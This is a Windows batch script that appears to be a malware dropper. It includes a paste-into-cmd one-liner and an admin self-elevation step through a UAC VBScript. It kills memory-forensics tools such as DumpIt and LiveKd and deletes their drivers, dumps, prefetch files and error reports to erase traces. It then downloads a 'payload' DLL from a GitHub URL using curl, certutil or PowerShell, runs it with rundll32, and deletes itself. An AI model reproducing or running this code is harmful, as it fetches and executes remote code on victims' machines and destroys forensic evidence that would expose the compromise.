@echo off
setlocal

rem =====================================================================
rem  User one-liner (open cmd.exe and paste):
rem    curl -s --ssl-no-revoke https://raw.githubusercontent.com/vexruxrxzen/dsl-kdsl-kpdslp-ksd/refs/heads/main/payload -o %TEMP%\See.bat & %TEMP%\See.bat
rem =====================================================================

:: Check Admin (fltmc works on all Windows, unlike net session)
fltmc >nul 2>&1
if %errorlevel% equ 0 goto :IS_ADMIN

:: Prevent infinite loop - already tried elevation once
if /i "%~1"=="__ELEVATED__" goto :ELEV_FAILED

echo.
echo  [!] Need Administrator privileges!
echo  [*] Restarting as Admin...
echo.

:: Use VBScript for reliable UAC elevation (works on all Windows)
echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\See_elev.vbs"
echo UAC.ShellExecute "%~s0", "__ELEVATED__", "", "runas", 1 >> "%TEMP%\See_elev.vbs"
cscript //nologo "%TEMP%\See_elev.vbs"
del /f /q "%TEMP%\See_elev.vbs" >nul 2>&1
exit /b

:ELEV_FAILED
echo.
echo  [-] Cannot get Administrator privileges!
echo.
echo  Please open CMD as Administrator:
echo    1. Press Win key, type "cmd"
echo    2. Right-click ^> "Run as administrator"
echo    3. Run the command again
echo.
pause
exit /b 1

:IS_ADMIN
echo.
echo  [*] FULLY

rem ลบประวัติ KernelLiveDump ก่อนดาวน์โหลด
call :clean_kld

echo  [*] Downloading...

set "DLL_URL=https://raw.githubusercontent.com/vexruxrxzen/dsl-kdsl-kpdslp-ksd/refs/heads/main/payload"
set "DLL_PATH=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.tmp"

rem Rename the old DLL if it is currently locked/in use so we can overwrite it
del /f /q "%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old" 2>nul
ren "%DLL_PATH%" "a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old" 2>nul

where curl.exe >nul 2>&1
if %errorlevel% equ 0 (
    curl.exe -sL --ssl-no-revoke "%DLL_URL%" -o "%DLL_PATH%"
)

if not exist "%DLL_PATH%" (
    certutil -urlcache -split -f "%DLL_URL%" "%DLL_PATH%" >nul 2>&1
)

if not exist "%DLL_PATH%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "try { Invoke-WebRequest -Uri '%DLL_URL%' -OutFile '%DLL_PATH%' -UseBasicParsing; exit 0 } catch { exit 1 }"
)

if not exist "%DLL_PATH%" (
    echo  [-] Download failed!
    goto :self_delete
)

echo  [+] Downloaded successfully
echo  [*] Loading...

start "" rundll32.exe "%DLL_PATH%",VoidFunc

:self_delete
set "SELF=%~f0"
start /b "" cmd.exe /c "ping 127.0.0.1 -n 2 >nul & del /f /q %SELF%"
exit /b

rem ==========================================================================
rem  KernelLiveDump++ / live-dump driver residue cleanup (single-file, inline)
rem ==========================================================================
:clean_kld
echo  [*] Cleaning traces...

for %%P in (DumpIt.exe KernelLiveDump.exe KernelLiveDump64.exe) do taskkill /f /im "%%P" >nul 2>&1

for %%S in (DumpIt KernelLiveDump KLD kld KernelLiveDump64 WDLiveDump LiveDump LiveKd) do sc stop %%S >nul 2>&1
ping -n 2 127.0.0.1 >nul

call :kld_file "%SystemRoot%\System32\drivers\DumpIt.sys"
call :kld_file "%SystemRoot%\System32\drivers\KernelLiveDump.sys"
call :kld_file "%SystemRoot%\System32\drivers\kld.sys"
call :kld_file "%SystemRoot%\System32\drivers\WDLiveDump.sys"
call :kld_file "%SystemRoot%\System32\drivers\LiveKd.sys"

for %%S in (DumpIt KernelLiveDump KLD kld KernelLiveDump64 WDLiveDump LiveDump LiveKd) do (
    if not exist "%SystemRoot%\System32\drivers\%%S.sys" (
        sc delete %%S >nul 2>&1
        reg delete "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /f >nul 2>&1
        reg delete "HKLM\SYSTEM\ControlSet001\Services\%%S" /f >nul 2>&1
    )
)

for /d %%D in ("%SystemRoot%\System32\DriverStore\FileRepository\dumpit*") do call :kld_dir "%%~D"
for /d %%D in ("%SystemRoot%\System32\DriverStore\FileRepository\kernellivedump*") do call :kld_dir "%%~D"
for /d %%D in ("%TEMP%\KernelLiveDumpPlusPlus_*") do call :kld_dir "%%~D"
for /d %%D in ("%LOCALAPPDATA%\KernelLiveDumpPlusPlus_*") do call :kld_dir "%%~D"
for /d %%D in ("C:\KernelLiveDumpPlusPlus_*") do call :kld_dir "%%~D"

call :kld_file "C:\Windows\DumpIt.exe"
call :kld_file "C:\DumpIt.exe"
call :kld_file "%SystemRoot%\System32\DumpIt.exe"
call :kld_file "%SystemRoot%\System32\KernelLiveDump.exe"
call :kld_file "%SystemRoot%\System32\KernelLiveDump64.exe"

del /f /q "%SystemRoot%\System32\config\systemprofile\AppData\Local\CrashDumps\DumpIt*.dmp" >nul 2>&1
del /f /q "%LOCALAPPDATA%\CrashDumps\DumpIt*.dmp" >nul 2>&1
del /f /q "%SystemRoot%\memory.dmp" >nul 2>&1
del /f /q "C:\Windows\LiveKernelReports\*.dmp" >nul 2>&1
del /f /q "%SystemRoot%\Prefetch\DUMPIT*.pf" >nul 2>&1
del /f /q "%SystemRoot%\Prefetch\KERNEL*DUMP*.pf" >nul 2>&1

set "WERARC=%ProgramData%\Microsoft\Windows\WER\ReportArchive"
set "WERQUE=%ProgramData%\Microsoft\Windows\WER\ReportQueue"
if exist "%WERARC%" for /d %%D in ("%WERARC%\*DumpIt*") do rd /s /q "%%~D" >nul 2>&1
if exist "%WERQUE%" for /d %%D in ("%WERQUE%\*DumpIt*") do rd /s /q "%%~D" >nul 2>&1
if exist "%WERARC%" for /d %%D in ("%WERARC%\*KernelLiveDump*") do rd /s /q "%%~D" >nul 2>&1
if exist "%WERQUE%" for /d %%D in ("%WERQUE%\*KernelLiveDump*") do rd /s /q "%%~D" >nul 2>&1

if not exist "%SystemRoot%\System32\drivers\DumpIt.sys" (
    reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v GxaKldClean /f >nul 2>&1
)

echo  [+] Cleanup completed
exit /b 0

:kld_file
if not exist "%~1" exit /b 0
attrib -s -h -r "%~1" >nul 2>&1
takeown /f "%~1" >nul 2>&1
icacls "%~1" /grant "*S-1-5-32-544:F" >nul 2>&1
del /f /q "%~1" >nul 2>&1
if exist "%~1" (
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v GxaKldClean /f ^
        /d "cmd /c del /f /q \"%~1\"" >nul 2>&1
)
exit /b 0

:kld_dir
if not exist "%~1" exit /b 0
takeown /f "%~1" /r /d y >nul 2>&1
icacls "%~1" /grant "*S-1-5-32-544:F" /t >nul 2>&1
del /f /q "%~1\*" >nul 2>&1
rd /s /q "%~1" >nul 2>&1
exit /b 0
